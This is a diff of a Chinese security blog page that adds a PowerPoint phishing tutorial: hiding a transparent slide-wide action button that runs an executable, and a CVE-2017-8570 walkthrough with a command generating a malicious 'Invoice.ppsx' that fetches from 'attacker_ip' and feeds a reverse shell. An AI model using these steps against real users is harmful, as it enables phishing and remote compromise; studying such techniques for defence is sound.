@@ -282,11 +282,51 @@
 <ol>
 <li>office宏钓鱼(xls钓鱼、doc钓鱼，ppt钓鱼)</li>
 <li>office漏洞钓鱼(office噩梦公式漏洞(CVE-2017-11882、CVE-2018-0802和CVE-2018-0789 )、office OLE对象中的逻辑漏洞(CVE-2017-0199) ）</li>
+<li>ppt钓鱼(非office宏)</li>
 <li>chm钓鱼</li>
 <li>自解压文件钓鱼</li>
 <li>PDF钓鱼</li>
+<li>快捷方式钓鱼</li>
 </ol>
-<h1 id="0x02-office宏钓鱼"><a href="#0x02-office宏钓鱼" class="headerlink" title="0x02 office宏钓鱼"></a>0x02 office宏钓鱼</h1><h1 id="0x0n-参考文章"><a href="#0x0n-参考文章" class="headerlink" title="0x0n 参考文章"></a>0x0n 参考文章</h1><p>office宏钓鱼：</p>
+<h1 id="0x02-office宏钓鱼"><a href="#0x02-office宏钓鱼" class="headerlink" title="0x02 office宏钓鱼"></a>0x02 office宏钓鱼</h1><h1 id="0x04-PPT钓鱼"><a href="#0x04-PPT钓鱼" class="headerlink" title="0x04 PPT钓鱼"></a>0x04 PPT钓鱼</h1><h2 id="0x0a-PPT动作按钮钓鱼"><a href="#0x0a-PPT动作按钮钓鱼" class="headerlink" title="0x0a PPT动作按钮钓鱼"></a>0x0a PPT动作按钮钓鱼</h2><p>PPT是常见的一种文档汇报格式，常用于汇报工作、分享内容时所用。在PPT中为了使展示效果更佳更流畅美观，于是加入动作这一功能，而在这个功能中却可以执行常见的exe等PE可执行文件，本次将要利用的也是这个功能</p>
+<p><img src="D:\hexo\blog\public\img\1550286794062.png" alt="1550286794062"></p>
+<p>利用步骤：</p>
+<ol>
+<li><p>首先新建一个PPT文件，打开该文件，任意填写内容即可</p>
+<p><img src="D:\hexo\blog\public\img\1550286880753.png" alt="1550286880753"></p>
+</li>
+<li><p>点击插入选择形状，任意形状即可，但是为了伪装，建议选择空白的那个形状</p>
+<p><img src="D:\hexo\blog\public\img\1550287055088.png" alt="1550287055088"></p>
+</li>
+<li><p>点击后，就会生成一个有颜色的框，并且可以添加动作内容，在这里建议选择悬停跟单击都点上</p>
+<p><img src="D:\hexo\blog\public\img\1550287151182.png" alt="1550287151182"></p>
+</li>
+<li><p>然后将蓝色的框更改色彩变成一个白色的造成透明的效果，之后再将这个白框拉成最大的，覆盖全局</p>
+<p><img src="D:\hexo\blog\public\img\1550287244024.png" alt="1550287244024"></p>
+</li>
+<li><p>然后再将最大化的白框置于底层，就可以彻底隐藏起来</p>
+<p><img src="D:\hexo\blog\public\img\1550287385837.png" alt="1550287385837"></p>
+</li>
+<li><p>点击幻灯片播放即可，触发动作执行</p>
+<p><img src="D:\hexo\blog\public\img\1550287492932.png" alt="1550287492932"></p>
+</li>
+</ol>
+<h2 id="0x0b-PPT-8570钓鱼"><a href="#0x0b-PPT-8570钓鱼" class="headerlink" title="0x0b PPT 8570钓鱼"></a>0x0b PPT 8570钓鱼</h2><p>8570钓鱼实际上就是利用CVE-2017-8570漏洞执行钓鱼，该漏洞是由于Microsoft PowerPoint执行时会初始化Script”Moniker对象，而在PowerPoint播放动画期间会激活该对象，从而执行sct脚本（Windows Script Component）文件。攻击者可以欺骗用户运行含有该漏洞的PPT文件，导致获取和当前登录用户相同的代码执行权限。漏洞详情参考<a href="http://www.freebuf.com/news/143206.html" target="_blank" rel="noopener">http://www.freebuf.com/news/143206.html</a> </p>
+<p>利用步骤：</p>
+<ol>
+<li><p>从ghithub下载利用工具<a href="https://github.com/tezukanice/Office8570，调试好工具，确保能在本地运行(如果在windows运行将源码打开，将文件目录修改一下即可，将template/template.ppsx修改为template.ppsx即可)" target="_blank" rel="noopener">https://github.com/tezukanice/Office8570，调试好工具，确保能在本地运行(如果在windows运行将源码打开，将文件目录修改一下即可，将template/template.ppsx修改为template.ppsx即可)</a></p>
+</li>
+<li><p>生成恶意的PPT文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://attacker_ip/logo.doc</span><br></pre></td></tr></table></figure>
+<p><img src="D:\hexo\blog\public\img\1550289370892.png" alt="1550289370892"></p>
+</li>
+<li><p>生成反弹shell文件，建议使用cobalstrike工具生成的反弹shell</p>
+</li>
+</ol>
+<ol start="4">
+<li>监听反弹的shell</li>
+</ol>
+<h1 id="0x0n-参考文章"><a href="#0x0n-参考文章" class="headerlink" title="0x0n 参考文章"></a>0x0n 参考文章</h1><p>office宏钓鱼：</p>
 <p><a href="https://www.secpulse.com/archives/37651.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/37651.html</a></p>
 <p><a href="https://secvul.com/topics/808.html" target="_blank" rel="noopener">https://secvul.com/topics/808.html</a></p>
 <p><a href="http://www.vuln.cn/6379" target="_blank" rel="noopener">http://www.vuln.cn/6379</a></p>
@@ -301,6 +341,12 @@
 <p><a href="http://www.vuln.cn/6720" target="_blank" rel="noopener">http://www.vuln.cn/6720</a></p>
 <p><a href="https://blog.csdn.net/u012324979/article/details/51979969" target="_blank" rel="noopener">https://blog.csdn.net/u012324979/article/details/51979969</a></p>
 <p><a href="https://422926799.github.io/2019/01/27/Chm-fishing/" target="_blank" rel="noopener">https://422926799.github.io/2019/01/27/Chm-fishing/</a></p>
+<p><a href="https://evi1cg.me/archives/chm_backdoor.html" target="_blank" rel="noopener">https://evi1cg.me/archives/chm_backdoor.html</a></p>
+<p>PPT钓鱼：</p>
+<p><a href="https://paper.tuisec.win/detail/41083905b0a82a1" target="_blank" rel="noopener">https://paper.tuisec.win/detail/41083905b0a82a1</a></p>
+<p><a href="https://www.freebuf.com/vuls/144054.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/144054.html</a></p>
+<p>自解压文件钓鱼：</p>
+<p><a href="https://paper.tuisec.win/detail/64f67b89865496c" target="_blank" rel="noopener">https://paper.tuisec.win/detail/64f67b89865496c</a></p>
 
       
 
@@ -1397,15 +1443,15 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">SSRF WEB安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">SSTI注入 web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">UEditor</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Windows-挖矿</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">逆向 二进制安全</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1413,11 +1459,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">注入 web安全</a>
+                <a href="javascript:void(0)" class="js-tag color4">逆向 二进制安全</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透 信息收集</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">windows</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1429,19 +1479,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">windows</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">CTF学习</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">SSTI注入 web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">windows-后门病毒</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1449,11 +1487,19 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">windows-后门病毒</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">注入 web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">SSRF WEB安全</a>
+                <a href="javascript:void(0)" class="js-tag color1">Windows-挖矿</a>
               </li>
             
             <div class="clearfix"></div>
